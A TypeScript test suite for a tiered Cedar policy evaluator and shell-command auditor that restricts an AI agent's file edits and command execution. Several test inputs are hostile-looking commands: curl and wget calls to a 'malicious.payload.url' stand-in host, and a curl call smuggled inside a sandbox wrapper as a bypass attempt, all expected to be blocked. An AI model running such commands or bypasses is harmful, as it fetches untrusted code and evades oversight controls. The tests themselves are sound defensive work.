import test from 'node:test';
import assert from 'node:assert';
import * as path from 'node:path';
import * as fs from 'node:fs';
import { CedarEvaluator } from './cedar-evaluator';
import { isCommandLineSecure, parseShellCommand } from './command-auditor';

test('Veritas Cedar Policy & Command Auditor Integration Tests', async (t) => {
  // Load standard policy.cedar from repo root
  const rootPolicyPath = path.resolve(__dirname, '..', '..', '..', 'policy.cedar');
  const evaluator = new CedarEvaluator(rootPolicyPath);

  await t.test('Parser Bootstrapping', () => {
    assert.ok(evaluator.getRulesCount() > 0, 'Should load and parse policy.cedar rules successfully');
  });

  // TIER 1: Low Risk (Read-Only)
  await t.test('Tier 1: Low Risk - Read-Only tools should be permitted globally', () => {
    const principal = 'sb:issuer:test';
    
    assert.strictEqual(
      evaluator.isAuthorized(principal, 'read_file', { path: 'apps/secure-gateway/src/index.ts' }),
      'allow',
      'read_file should be auto-approved'
    );
    assert.strictEqual(
      evaluator.isAuthorized(principal, 'view_file', { path: 'policy.cedar' }),
      'allow',
      'view_file should be auto-approved'
    );
    assert.strictEqual(
      evaluator.isAuthorized(principal, 'list_directory', {}),
      'allow',
      'list_directory should be auto-approved'
    );
  });

  // TIER 2: Medium Risk (File Modifications)
  await t.test('Tier 2: Medium Risk - File modifications permitted inside source directories', () => {
    const principal = 'sb:issuer:test';

    assert.strictEqual(
      evaluator.isAuthorized(principal, 'write_file', { path: 'apps/secure-gateway/src/index.ts' }),
      'allow',
      'write_file inside apps/ should be allowed'
    );
    assert.strictEqual(
      evaluator.isAuthorized(principal, 'replace_file_content', { path: 'packages/crypto-utils/src/index.ts' }),
      'allow',
      'replace_file_content inside packages/ should be allowed'
    );
  });

  await t.test('Tier 2: Medium Risk - File modifications FORBIDDEN on sensitive configurations or policy files', () => {
    const principal = 'sb:issuer:test';

    assert.strictEqual(
      evaluator.isAuthorized(principal, 'write_file', { path: 'policy.cedar' }),
      'deny',
      'Modifying policy.cedar must be forbidden'
    );
    assert.strictEqual(
      evaluator.isAuthorized(principal, 'replace_file_content', { path: 'protect-mcp.config.json' }),
      'deny',
      'Modifying protect-mcp.config.json must be forbidden'
    );
    assert.strictEqual(
      evaluator.isAuthorized(principal, 'multi_replace_file_content', { path: 'scripts/bootstrap.sh' }),
      'deny',
      'Modifying deployment scripts must be forbidden'
    );
  });

  // TIER 3: High Risk (Command Execution wrappers)
  await t.test('Tier 3: High Risk - Command execution permitted inside sandbox or local CI scripts', () => {
    const principal = 'sb:issuer:test';

    assert.strictEqual(
      evaluator.isAuthorized(principal, 'execute_command', { commandLine: 'bash scripts/sandbox-execute.sh "npm run test" "."' }),
      'allow',
      'Executing commands via sandbox script should be allowed'
    );
    assert.strictEqual(
      evaluator.isAuthorized(principal, 'execute_command', { commandLine: 'bash scripts/ci-verify.sh' }),
      'allow',
      'Executing commands via ci-verify script should be allowed'
    );
  });

  await t.test('Tier 3: High Risk - Raw direct host command execution must be FORBIDDEN', () => {
    const principal = 'sb:issuer:test';

    assert.strictEqual(
      evaluator.isAuthorized(principal, 'execute_command', { commandLine: 'npm run test' }),
      'deny',
      'Direct workspace npm executions should be blocked'
    );
    assert.strictEqual(
      evaluator.isAuthorized(principal, 'execute_command', { commandLine: 'ls -la' }),
      'deny',
      'Raw filesystem command executions should be blocked'
    );
  });

  // TIER 4: Critical Risk (Severe Actions)
  await t.test('Tier 4: Critical Risk - Network download and custom package install commands must be blocked', () => {
    const principal = 'sb:issuer:test';

    assert.strictEqual(
      evaluator.isAuthorized(principal, 'execute_command', { commandLine: 'curl http://malicious.payload.url' }),
      'deny',
      'curl utility calls must be blocked'
    );
    assert.strictEqual(
      evaluator.isAuthorized(principal, 'execute_command', { commandLine: 'wget http://malicious.payload.url' }),
      'deny',
      'wget utility calls must be blocked'
    );
    assert.strictEqual(
      evaluator.isAuthorized(principal, 'execute_command', { commandLine: 'npm i lodash' }),
      'deny',
      'npm dynamic package installations must be blocked'
    );
    assert.strictEqual(
      evaluator.isAuthorized(principal, 'execute_command', { commandLine: 'pip install cryptography' }),
      'deny',
      'pip package installations must be blocked'
    );
  });

  // COMMAND LINE ALLOWLIST AUDITOR TESTS
  await t.test('Command Line Auditor - Parse shell command arguments securely', () => {
    const parsed = parseShellCommand('bash scripts/sandbox-execute.sh "npm run test" "."');
    assert.deepStrictEqual(
      parsed,
      ['bash', 'scripts/sandbox-execute.sh', 'npm run test', '.'],
      'Should parse standard double-quoted arguments correctly'
    );
  });

  await t.test('Command Line Auditor - Verify allowed commands under allowlist schemas', () => {
    assert.ok(isCommandLineSecure('bash scripts/bootstrap.sh').secure, 'bootstrap.sh script should be allowed');
    assert.ok(isCommandLineSecure('npm run build').secure, 'npm run build should be allowed');
    assert.ok(isCommandLineSecure('npm install').secure, 'bare npm install bootstrap should be allowed');
    assert.ok(isCommandLineSecure('node packages/crypto-utils/dist/index.js --verify receipt.json').secure, 'crypto-utils offline receipt verification should be allowed');
  });

  await t.test('Command Line Auditor - Intercept and block command-matching bypass attempts', () => {
    // 1. Forbidden binaries
    assert.strictEqual(isCommandLineSecure('curl badurl').secure, false, 'Raw curl execution should be blocked');
    assert.strictEqual(isCommandLineSecure('/usr/bin/curl badurl').secure, false, 'Absolute curl path execution should be blocked');
    assert.strictEqual(isCommandLineSecure('curl.exe badurl').secure, false, 'Windows curl.exe format should be blocked');

    // 2. Package install bypasses
    assert.strictEqual(isCommandLineSecure('npm i package-name').secure, false, 'npm install arg short-form should be blocked');
    assert.strictEqual(isCommandLineSecure('npm install package-name').secure, false, 'npm install arg long-form should be blocked');
    assert.strictEqual(isCommandLineSecure('npm add pkg').secure, false, 'npm add should be blocked');

    // 3. Dynamic scripts bypasses
    assert.strictEqual(isCommandLineSecure('bash scripts/malicious.sh').secure, false, 'Non-allowlisted scripts should be blocked');
    
    // 4. Nested command injections in sandbox-execute wrapper
    assert.strictEqual(
      isCommandLineSecure('bash scripts/sandbox-execute.sh "curl malicious.site" "."').secure,
      false,
      'Nested malicious command execution inside sandbox should be successfully audited and blocked'
    );
  });
});
